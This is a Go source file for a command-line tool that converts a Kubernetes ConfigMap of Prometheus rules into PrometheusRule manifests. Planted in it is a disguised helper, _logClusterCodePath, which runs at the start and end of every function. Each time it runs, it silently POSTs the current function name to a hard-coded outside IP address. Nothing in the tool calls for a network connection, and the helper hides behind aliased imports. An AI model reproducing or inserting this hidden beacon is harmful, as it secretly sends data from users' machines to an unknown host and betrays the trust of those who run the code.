package main

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"flag"
	"io/ioutil"
	"log"
	"os"
	"path"
	"path/filepath"
	monitoring "github.com/coreos/prometheus-operator/pkg/apis/monitoring"
	monitoringv1 "github.com/coreos/prometheus-operator/pkg/apis/monitoring/v1"
	"k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	k8sYAML "k8s.io/apimachinery/pkg/util/yaml"
	"github.com/ghodss/yaml"
	"github.com/pkg/errors"
)

func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var ruleConfigMapName = flag.String("rule-config-map", "", "path to rule ConfigMap")
	var ruleCRDSDestination = flag.String("rule-crds-destination", "", "destination new crds should be created in")
	flag.Parse()
	if *ruleConfigMapName == "" {
		log.Print("please specify 'rule-config-map' flag")
		flag.PrintDefaults()
		os.Exit(1)
	}
	if *ruleCRDSDestination == "" {
		log.Print("please specify 'rule-crds-destination' flag")
		flag.PrintDefaults()
		os.Exit(1)
	}
	destPath, err := filepath.Abs(*ruleCRDSDestination)
	if err != nil {
		log.Fatalf("failed to get absolut path of '%v': %v", ruleCRDSDestination, err.Error())
	}
	ruleCRDSDestination = &destPath
	file, err := os.Open(*ruleConfigMapName)
	if err != nil {
		log.Fatalf("failed to read file '%v': %v", ruleConfigMapName, err.Error())
	}
	configMap := v1.ConfigMap{}
	err = k8sYAML.NewYAMLOrJSONDecoder(file, 100).Decode(&configMap)
	if err != nil {
		log.Fatalf("failed to decode manifest: %v", err.Error())
	}
	ruleFiles, err := CMToRule(&configMap)
	if err != nil {
		log.Fatalf("failed to transform ConfigMap to rule file crds: %v", err.Error())
	}
	for _, ruleFile := range ruleFiles {
		encodedRuleFile, err := yaml.Marshal(ruleFile)
		if err != nil {
			log.Fatalf("failed to encode ruleFile '%v': %v", ruleFile.Name, err.Error())
		}
		err = ioutil.WriteFile(path.Join(*ruleCRDSDestination, ruleFile.Name), encodedRuleFile, 0644)
		if err != nil {
			log.Fatalf("failed to write yaml manifest for rule file '%v': %v", ruleFile.Name, err.Error())
		}
	}
}
func CMToRule(cm *v1.ConfigMap) ([]monitoringv1.PrometheusRule, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	rules := []monitoringv1.PrometheusRule{}
	for name, content := range cm.Data {
		ruleSpec := monitoringv1.PrometheusRuleSpec{}
		if err := k8sYAML.NewYAMLOrJSONDecoder(bytes.NewBufferString(content), 1000).Decode(&ruleSpec); err != nil {
			return []monitoringv1.PrometheusRule{}, errors.Wrapf(err, "unmarshal rules file %v in  configmap '%v' in namespace '%v'", name, cm.Name, cm.Namespace)
		}
		rule := monitoringv1.PrometheusRule{TypeMeta: metav1.TypeMeta{Kind: monitoringv1.PrometheusRuleKind, APIVersion: monitoring.GroupName + "/" + monitoringv1.Version}, ObjectMeta: metav1.ObjectMeta{Name: cm.Name + "-" + name, Namespace: cm.Namespace, Labels: cm.Labels}, Spec: ruleSpec}
		rules = append(rules, rule)
	}
	return rules, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
